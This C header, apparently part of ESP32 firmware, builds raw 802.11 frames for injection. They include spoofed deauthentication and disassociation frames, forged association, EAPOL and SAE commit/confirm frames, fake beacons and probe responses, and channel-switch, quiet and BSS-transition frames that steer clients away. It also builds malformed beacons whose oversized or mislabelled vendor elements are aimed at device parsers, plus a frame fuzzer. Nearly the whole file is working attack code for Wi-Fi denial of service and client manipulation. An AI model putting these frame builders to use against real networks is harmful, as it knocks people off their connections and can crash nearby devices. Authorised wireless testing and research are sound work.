#pragma once
#include <stdint.h>
#include <string.h>

extern uint16_t g_seq;

static const uint8_t BC[6]   = {0xff,0xff,0xff,0xff,0xff,0xff};
static const uint8_t RATES[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
static const uint8_t RSNIE[] = {0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,
                                0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00};
static const uint8_t RSN_TKIP[] = {0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x02,0x01,0x00,
                                  0x00,0x0f,0xac,0x02,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00};
static const uint8_t RSN_PMFREQ[] = {0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,
                                     0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0xc0,0x00};
static const uint8_t WPA1IE[] = {0xdd,0x16,0x00,0x50,0xf2,0x01,0x01,0x00,0x00,0x50,0xf2,0x02,
                                 0x01,0x00,0x00,0x50,0xf2,0x02,0x01,0x00,0x00,0x50,0xf2,0x02};

static inline void fhdr(uint8_t* f, uint8_t fc0, uint8_t fc1,
                        const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
  f[0]=fc0; f[1]=fc1; f[2]=0; f[3]=0;
  memcpy(f+4, da, 6); memcpy(f+10, sa, 6); memcpy(f+16, bssid, 6);
  uint16_t s = g_seq++ & 0x0FFF;
  f[22] = s & 0xFF; f[23] = (s >> 8) & 0x0F;
}

static inline size_t ieSsid(uint8_t* p, const char* ssid) {
  size_t l = strlen(ssid); if (l > 32) l = 32;
  p[0] = 0; p[1] = (uint8_t)l; memcpy(p+2, ssid, l); return l + 2;
}
static inline size_t ieDs(uint8_t* p, uint8_t ch)   { p[0]=3;  p[1]=1; p[2]=ch; return 3; }
static inline size_t ieCsa(uint8_t* p, uint8_t ch)  { p[0]=37; p[1]=3; p[2]=1; p[3]=ch; p[4]=0; return 5; }
static inline size_t ieRates(uint8_t* p)            { p[0]=1; p[1]=8; memcpy(p+2,RATES,8); return 10; }
static inline size_t ieRsn(uint8_t* p)              { memcpy(p,RSNIE,sizeof(RSNIE)); return sizeof(RSNIE); }

static inline size_t f_deauth(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t reason) {
  fhdr(f, 0xC0, 0x00, sta, ap, ap); f[24] = reason; f[25] = 0; return 26;
}
// Reverse direction: STA→AP (spoof STA as source)
static inline size_t f_deauth_r(uint8_t* f, const uint8_t* ap, const uint8_t* sta, uint8_t reason) {
  fhdr(f, 0xC0, 0x00, ap, sta, ap); f[24] = reason; f[25] = 0; return 26;
}
static inline size_t f_disassoc(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t reason) {
  fhdr(f, 0xA0, 0x00, sta, ap, ap); f[24] = reason; f[25] = 0; return 26;
}
static inline size_t f_disassoc_r(uint8_t* f, const uint8_t* ap, const uint8_t* sta, uint8_t reason) {
  fhdr(f, 0xA0, 0x00, ap, sta, ap); f[24] = reason; f[25] = 0; return 26;
}
static inline size_t f_auth(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0xB0, 0x00, ap, sta, ap);
  f[24]=0; f[25]=0; f[26]=1; f[27]=0; f[28]=0; f[29]=0;
  return 30;
}
static inline size_t f_assoc(uint8_t* f, const uint8_t* sta, const uint8_t* ap, const char* ssid) {
  fhdr(f, 0x00, 0x00, ap, sta, ap);
  size_t p = 24;
  f[p++]=0x11; f[p++]=0x04; f[p++]=0x0a; f[p++]=0x00;
  p += ieSsid(f+p, ssid);
  p += ieRates(f+p);
  return p;
}
static inline size_t f_reassoc(uint8_t* f, const uint8_t* sta, const uint8_t* ap, const char* ssid) {
  fhdr(f, 0x20, 0x00, ap, sta, ap);
  size_t p = 24;
  f[p++]=0x11; f[p++]=0x04; f[p++]=0x0a; f[p++]=0x00;
  memcpy(f+p, ap, 6); p += 6;
  p += ieSsid(f+p, ssid);
  p += ieRates(f+p);
  return p;
}
static inline size_t f_eapolStart(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x08, 0x01, ap, sta, ap);
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x88,0x8e};
  memcpy(f+24, llc, 8);
  f[32]=1; f[33]=1; f[34]=0; f[35]=0;
  return 36;
}
static inline size_t f_eapolType(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t t) {
  fhdr(f, 0x08, 0x01, ap, sta, ap);
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x88,0x8e};
  memcpy(f+24, llc, 8); f[32]=1; f[33]=t; f[34]=0; f[35]=0; return 36;
}
static inline size_t f_eapIdentity(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x08, 0x01, ap, sta, ap);
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x88,0x8e};
  memcpy(f+24, llc, 8);
  f[32]=1; f[33]=0; f[34]=4; f[35]=0;
  f[36]=1; f[37]=1; f[38]=0; f[39]=1; return 40;
}
static inline size_t f_saeCommit(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0xB0, 0x00, ap, sta, ap);
  size_t p = 24;
  f[p++]=3; f[p++]=0; f[p++]=1; f[p++]=0; f[p++]=0; f[p++]=0; f[p++]=19; f[p++]=0;
  for (int i = 0; i < 32; i++) f[p++] = esp_random() & 0xFF;
  for (int i = 0; i < 64; i++) f[p++] = esp_random() & 0xFF;
  return p;
}
static inline size_t f_saeConfirm(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0xB0, 0x00, ap, sta, ap);
  size_t p = 24;
  f[p++]=3; f[p++]=0; f[p++]=2; f[p++]=0; f[p++]=0; f[p++]=0;
  for (int i = 0; i < 64; i++) f[p++] = esp_random() & 0xFF;
  return p;
}
static inline size_t f_eapolM1(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x08, 0x01, ap, sta, ap);
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x88,0x8e};
  memcpy(f+24, llc, 8);
  uint8_t* e = f + 32;
  e[0]=1; e[1]=3; e[2]=0; e[3]=95; e[4]=2; e[5]=0x8A; e[6]=0x00;
  e[7]=0; e[8]=16;
  for (int i = 0; i < 32; i++) e[17+i] = esp_random() & 0xFF;
  return 131;
}
static inline size_t f_beacon(uint8_t* f, const uint8_t* bssid, const char* ssid,
                              uint8_t ch, bool wpa, int csaCh) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00;
  uint16_t cap = wpa ? 0x0411 : 0x0401;
  f[p++] = cap & 0xFF; f[p++] = cap >> 8;
  p += ieSsid(f+p, ssid);
  p += ieRates(f+p);
  p += ieDs(f+p, ch);
  if (wpa) p += ieRsn(f+p);
  if (csaCh) p += ieCsa(f+p, (uint8_t)csaCh);
  return p;
}
static inline size_t f_probeResp(uint8_t* f, const uint8_t* sta, const uint8_t* bssid,
                                 const char* ssid, uint8_t ch, bool wpa) {
  fhdr(f, 0x50, 0x00, sta, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00;
  uint16_t cap = wpa ? 0x0411 : 0x0401;
  f[p++] = cap & 0xFF; f[p++] = cap >> 8;
  p += ieSsid(f+p, ssid);
  p += ieRates(f+p);
  p += ieDs(f+p, ch);
  if (wpa) p += ieRsn(f+p);
  return p;
}
static inline size_t f_probeReq(uint8_t* f, const uint8_t* sta, const char* ssid) {
  fhdr(f, 0x40, 0x00, BC, sta, BC);
  size_t p = 24;
  p += ieSsid(f+p, ssid);
  p += ieRates(f+p);
  return p;
}
static inline size_t f_tkipMic(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x08, 0x01, ap, sta, ap);
  memset(f+24, 0, 8);
  f[27] = 0x60;
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x08,0x00};
  memcpy(f+32, llc, 8);
  memset(f+40, 0xA5, 16);
  memset(f+56, 0x5A, 8);
  return 64;
}
static inline size_t f_nullData(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x48, 0x01, ap, sta, ap); return 24;
}
static inline size_t f_qosNull(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0xC8, 0x01, ap, sta, ap); f[24]=0; f[25]=0; return 26;
}
static inline size_t f_rts(uint8_t* f, const uint8_t* ra, const uint8_t* ta) {
  f[0]=0xB4; f[1]=0; f[2]=0x2E; f[3]=0;
  memcpy(f+4, ra, 6); memcpy(f+10, ta, 6); return 16;
}
static inline size_t f_cts(uint8_t* f, const uint8_t* ra) {
  f[0]=0xC4; f[1]=0; f[2]=0x2E; f[3]=0;
  memcpy(f+4, ra, 6); return 10;
}
static inline size_t f_ack(uint8_t* f, const uint8_t* ra) {
  f[0]=0xD4; f[1]=0; f[2]=0; f[3]=0;
  memcpy(f+4, ra, 6); return 10;
}
static inline size_t f_pspoll(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  f[0]=0xA4; f[1]=0; f[2]=0x01; f[3]=0xC0;
  memcpy(f+4, ap, 6); memcpy(f+10, sta, 6); return 16;
}
static inline size_t f_bar(uint8_t* f, const uint8_t* ra, const uint8_t* ta) {
  f[0]=0x94; f[1]=0; f[2]=0; f[3]=0;
  memcpy(f+4, ra, 6); memcpy(f+10, ta, 6);
  f[16]=0x04; f[17]=0; f[18]=0; f[19]=0; return 20;
}
static inline size_t f_trigger(uint8_t* f, const uint8_t* ra, const uint8_t* ta) {
  f[0]=0x24; f[1]=0; f[2]=0x2E; f[3]=0;
  memcpy(f+4, ra, 6); memcpy(f+10, ta, 6);
  f[16]=0; f[17]=0; f[18]=0x04; f[19]=0; return 20;
}
static inline size_t f_actionBTM(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t ch) {
  fhdr(f, 0xD0, 0x00, sta, ap, ap);
  size_t p = 24;
  f[p++]=10; f[p++]=7; f[p++]=1; f[p++]=0; f[p++]=0; f[p++]=0; f[p++]=5; f[p++]=ch;
  return p;
}
static inline size_t f_actionNeighbor(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t ch) {
  fhdr(f, 0xD0, 0x00, sta, ap, ap);
  size_t p = 24;
  f[p++]=5; f[p++]=4; f[p++]=1; f[p++]=52; f[p++]=13;
  memcpy(f+p, ap, 6); p += 6;
  f[p++]=0; f[p++]=0; f[p++]=0; f[p++]=0; f[p++]=ch; f[p++]=ch; f[p++]=0;
  return p;
}
static inline size_t f_quiet(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x01; f[p++]=0x04;
  p += ieSsid(f+p, ssid); p += ieRates(f+p); p += ieDs(f+p, ch);
  f[p++]=40; f[p++]=6; f[p++]=1; f[p++]=1; f[p++]=0x2C; f[p++]=0x01; f[p++]=0; f[p++]=0;
  return p;
}
static inline size_t f_ecsa(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch, uint8_t nc) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x11; f[p++]=0x04;
  p += ieSsid(f+p, ssid); p += ieRates(f+p); p += ieDs(f+p, ch); p += ieRsn(f+p);
  f[p++]=60; f[p++]=4; f[p++]=1; f[p++]=nc; f[p++]=0; f[p++]=0;
  return p;
}
static inline size_t f_ssidOverflow(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x11; f[p++]=0x04;
  char big[33]; size_t l = strlen(ssid); if (l > 32) l = 32;
  memcpy(big, ssid, l); while (l < 32) big[l++] = 'X'; big[32] = 0;
  p += ieSsid(f+p, big); p += ieRates(f+p); p += ieDs(f+p, ch);
  f[p++]=221; f[p++]=200;
  for (int i = 0; i < 200; i++) f[p++] = (uint8_t)(esp_random() & 0xFF);
  return p;
}
static inline size_t f_wpsBeacon(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x11; f[p++]=0x04;
  p += ieSsid(f+p, ssid); p += ieRates(f+p); p += ieDs(f+p, ch); p += ieRsn(f+p);
  f[p++]=221; f[p++]=9; f[p++]=0x00; f[p++]=0x50; f[p++]=0xf2; f[p++]=0x04;
  f[p++]=0x10; f[p++]=0x4a; f[p++]=0x00; f[p++]=0x01; f[p++]=0x10;
  return p;
}
static inline size_t f_wds(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x08, 0x03, BC, sta, ap);
  memcpy(f+24, sta, 6);
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x08,0x00};
  memcpy(f+30, llc, 8);
  return 38;
}
static inline size_t f_ieBeacon(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch,
                                const uint8_t* extra, size_t extralen, bool useRsn, const uint8_t* rsn) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x11; f[p++]=0x04;
  p += ieSsid(f+p, ssid);
  p += ieRates(f+p);
  p += ieDs(f+p, ch);
  if (useRsn && rsn) { memcpy(f+p, rsn, 22); p += 22; }
  if (extra && extralen) { memcpy(f+p, extra, extralen); p += extralen; }
  return p;
}
static inline size_t f_bigBeacon(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x11; f[p++]=0x04;
  p += ieSsid(f+p, ssid); p += ieRates(f+p); p += ieDs(f+p, ch);
  f[p++]=221; f[p++]=250;
  for (int i = 0; i < 250; i++) f[p++] = (uint8_t)(esp_random() & 0xFF);
  return p;
}
static inline size_t f_ieOverflow(uint8_t* f, const uint8_t* bssid, const char* ssid, uint8_t ch) {
  fhdr(f, 0x80, 0x00, BC, bssid, bssid);
  size_t p = 24;
  memset(f+p, 0, 8); p += 8;
  f[p++]=0x64; f[p++]=0x00; f[p++]=0x11; f[p++]=0x04;
  p += ieSsid(f+p, ssid); p += ieRates(f+p); p += ieDs(f+p, ch);
  f[p++]=221; f[p++]=255;
  for (int i = 0; i < 200; i++) f[p++] = (uint8_t)(esp_random() & 0xFF);
  return p;
}
static inline size_t f_dupSeq(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
  fhdr(f, 0x08, 0x01, ap, sta, ap);
  f[22]=0; f[23]=0;
  static const uint8_t llc[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x08,0x00};
  memcpy(f+24, llc, 8);
  memset(f+32, 0x11, 20); return 52;
}
static inline size_t f_fuzz(uint8_t* f, uint16_t* seed, const uint8_t* sta) {
  *seed = (*seed * 25173u) + 13849u;
  uint8_t r = (*seed >> 8);
  fhdr(f, (uint8_t)(r & 0xFC), (uint8_t)(*seed >> 3), BC, sta, sta);
  size_t n = 24 + (r % 96);
  for (size_t i = 24; i < n; i++) {
    *seed = (*seed * 25173u) + 13849u;
    f[i] = (uint8_t)(*seed >> 9);
  }
  return n;
}
